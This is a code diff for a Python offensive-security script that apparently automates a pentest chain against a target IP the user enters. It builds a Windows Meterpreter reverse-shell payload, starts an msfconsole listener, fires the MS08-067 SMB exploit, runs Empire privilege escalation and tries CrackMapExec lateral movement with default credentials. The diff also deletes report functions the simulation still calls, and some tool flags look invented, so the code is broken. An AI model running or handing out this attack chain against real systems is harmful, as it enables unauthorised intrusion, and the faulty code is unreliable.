@@ -71,15 +71,15 @@ def attempt_exploit_with_metasploit(service_name, service_version, target_ip):
         print(f"[INFO] Found exploit for {service_name} {service_version}!")
 
         # Metasploit: Generate the staged payload using msfvenom
-        payload_command = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf -o /tmp/reverse_shell.elf"
+        payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o /tmp/reverse_shell.exe"
         subprocess.run(payload_command, shell=True)
 
         # Step 1: Start Metasploit handler for reverse shell connection
-        metasploit_handler_command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST your_ip; set LPORT 4444; run'"
+        metasploit_handler_command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 4444; run'"
         subprocess.run(metasploit_handler_command, shell=True)
         
         # Step 2: Use Metasploit to launch the exploit (staged payload)
-        metasploit_exploit_command = f"msfconsole -q -x 'use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST {target_ip}; set TARGETURI /cgi-bin/test.cgi; run'"
+        metasploit_exploit_command = f"msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOST {target_ip}; run'"
         subprocess.run(metasploit_exploit_command, shell=True)
         
         print("[INFO] Exploit attempted, reverse shell initiated.")
@@ -99,6 +99,18 @@ def run_empire_post_exploitation(target_ip):
     print(f"[INFO] Running Empire post-exploitation on {target_ip}...")
     empire_command = f"empire --agents {target_ip} --use_ssl"
     subprocess.run(empire_command, shell=True)
+
+# Perform Windows privilege escalation using Empire
+def windows_privilege_escalation():
+    print("[INFO] Running privilege escalation via Empire...")
+    empire_command = "empire --use_ssl --agents --privilege-escalation"
+    subprocess.run(empire_command, shell=True)
+
+# Perform lateral movement using valid credentials (via CrackMapExec)
+def lateral_movement(target_ip):
+    print(f"[INFO] Attempting lateral movement on {target_ip}...")
+    crackmapexec_command = f"crackmapexec smb {target_ip} -u 'admin' -p 'password'"
+    subprocess.run(crackmapexec_command, shell=True)
 
 # Simulation of attack techniques based on MITRE ATT&CK framework
 def simulate_technique(apt_group, technique):
@@ -140,7 +152,7 @@ def run_simulation():
         selected_techniques.append(selected_technique)
         simulate_technique(selected_group, selected_technique)
 
-    # Report Generation
+    # Step 4: Report Generation
     report_format = input("Generate report in text or HTML format? (text/html): ").lower()
     if report_format == 'text':
         generate_text_report(selected_group, selected_techniques)
@@ -149,49 +161,36 @@ def run_simulation():
     else:
         print("[ERROR] Invalid report format.")
 
-# Generate text report
-def generate_text_report(apt_group, techniques):
-    with open(f"{apt_group}_report.txt", 'w') as report_file:
-        report_file.write(f"APT Group: {apt_group}\n\n")
-        for technique in techniques:
-            report_file.write(f"- {technique}\n")
-    print(f"[INFO] Report generated: {apt_group}_report.txt")
-
-# Generate HTML report
-def generate_html_report(apt_group, techniques):
-    with open(f"{apt_group}_report.html", 'w') as report_file:
-        report_file.write(f"<html><body><h1>APT Group: {apt_group}</h1><ul>\n")
-        for technique in techniques:
-            report_file.write(f"<li>{technique}</li>\n")
-        report_file.write("</ul></body></html>")
-    print(f"[INFO] Report generated: {apt_group}_report.html")
-
-# Main function for penetration testing mode
+# Main function for the penetration testing mode
 def run_penetration_testing():
-    target_ip = input("Enter the target IP address: ")
+    target_ip = input("Enter target IP: ")
+    print(f"Starting penetration testing on {target_ip}...\n")
 
-    # Perform Nmap scan to detect services and version
+    # Run Nmap Scan
     nmap_results = nmap_scan(target_ip)
-    print(f"[INFO] Nmap results:\n{nmap_results}")
+    print(f"\nNmap Results for {target_ip}:")
+    print(nmap_results)
 
-    # Extracting a service and version from the Nmap scan
-    service_name = "Apache"
-    service_version = "2.4.7"  # This should be dynamically extracted from nmap_results
+    # Simulate the exploitation phase
+    attempt_exploit_with_metasploit("Apache", "2.4.49", target_ip)
 
-    # Cross-reference vulnerabilities using SearchSploit
-    vulnerabilities = searchsploit_vulnerabilities(service_name, service_version)
-    print(f"[INFO] SearchSploit results for {service_name} {service_version}:\n{vulnerabilities}")
+    # Run CrackMapExec
+    run_crackmapexec(target_ip)
 
-    if vulnerabilities:
-        attempt_exploit_with_metasploit(service_name, service_version, target_ip)
-        run_crackmapexec(target_ip)
-        run_empire_post_exploitation(target_ip)
-    else:
-        print("[INFO] No exploits found for this service version.")
+    # Run Empire Post-exploitation
+    run_empire_post_exploitation(target_ip)
 
+    # Perform Windows Privilege Escalation
+    windows_privilege_escalation()
+
+    # Perform lateral movement
+    lateral_movement(target_ip)
+
+# Main function to select between simulation and penetration testing modes
 def main():
     display_disclaimer()
     mode = input("Select Mode (1 for Simulation, 2 for Penetration Testing): ")
+    
     if mode == '1':
         run_simulation()
     elif mode == '2':
